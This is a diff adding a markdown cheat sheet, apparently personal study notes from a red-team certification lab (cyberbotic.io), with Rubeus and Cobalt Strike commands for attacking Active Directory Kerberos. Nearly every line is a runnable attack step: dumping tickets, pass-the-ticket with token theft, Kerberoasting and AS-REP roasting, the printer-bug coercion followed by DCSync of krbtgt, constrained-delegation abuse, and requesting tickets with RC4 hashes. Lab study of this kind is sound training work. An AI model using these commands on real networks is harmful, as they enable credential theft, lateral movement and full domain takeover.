@@ -1,0 +1,42 @@
+- Show all tickets in memory
+	- `Rubeus triage`
+- Get TGT for user and write to a file
+	- `execute-assembly /home/alh4zr3d/CRTO/Rubeus.exe asktgt /user:n.lamb /rc4:2e8a408a8aec852ef2e458b938b8c071 /nowrap`
+	-  `[System.IO.File]::WriteAllBytes("C:\Users\IEUser\Desktop\nlamb-tgt.kirbi", [System.Convert]::FromBase64String("doIF[...snip...]Lmlv"))`
+- Pass-the-Ticket
+	-  Create net-only process (take note of PID and LUID)
+		-  `rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe`
+	-  Pass the ticket into the new logon session
+		-  `rubeus.exe ptt /luid:<luid> /ticket:[...snip...]`
+	-  Impersonate token from that process
+		-  `steal_token <pid>`
+	-  Verify you have access, then jump
+		-  `ls \\DC-1\C$`
+		-  `jump winrm64 DC-1 tcp`
+-  Kerberoast all users
+	-  `execute-assembly /home/alh4zr3d/CRTO/Rubeus.exe kerberoast`
+-  ASREPRoast all users
+	-  `execute-assembly /home/alh4zr3d/CRTO/Rubeus.exe asreproast /format:hashcat`
+-  Find all available kerberos tickets in memory (for a user, or all users if in elevated context)
+	-  `execute-assembly /home/alh4zr3d/CRTO/Rubeus.exe`
+-  Dump tickets from memory
+	-  `execute-assembly /home/alh4zr3d/CRTO/Rubeus.exe (/luid:\<luid\> or /service:\<service name\>)`
+-  Create process as another user, pass TGT into new logon session, impersonate process, lateral mvmnt
+	-  `execute-assembly /home/alh4zr3d/CRTO/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe`
+	-  `execute-assembly /home/alh4zr3d/CRTO/Rubeus.exe ptt /luid:0x21d8e17 /ticket:\[...snip...\]`
+-  The "Printer Bug" (Force any machine on the domain to authenticate to owned machine, capture TGT, extract hashes from machine)
+	-  `execute-assembly /home/alh4zr3d/CRTO/Rubeus.exe monitor /interval:10`
+	-  `execute-assembly E:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe dc-1.cyberbotic.io web-1.cyberbotic.io`
+	-  Rubeus should now capture new TGT
+	-  Copy file to .kirbi file on local computer
+	-  `kerberos_ticket_use C:\Users\Rasta\Desktop\dc-1.kirbi`
+	-  `dcsync cyberbotic.io CYBER\krbtgt`
+-  Constrained Delegation exploitation
+	-  Extract the computer's TGT since it is the computer that is trusted for delegation
+		-  `execute-assembly /home/alh4zr3d/CRTO/Rubeus.exe dump /service:krbtgt`
+	-  Rubeus s4u, impersonating user with local admin on target
+		-  `rubeus.exe s4u /impersonateuser:n.glover /msdsspn:cifs/fs-1.cyberbotic.io /ticket:\[...snip...\]`
+	-  Rubeus PTT and impersonate the token to use TGS
+- Connect with PowerShell Remoting
+	- `Rubeus.exe asktgt /user:Administrator /rc4:b73fdfe10e87b4ca5c0d957f81de6863 /ptt`
+	-  `Enter-PSSession -ComputerName dc01`
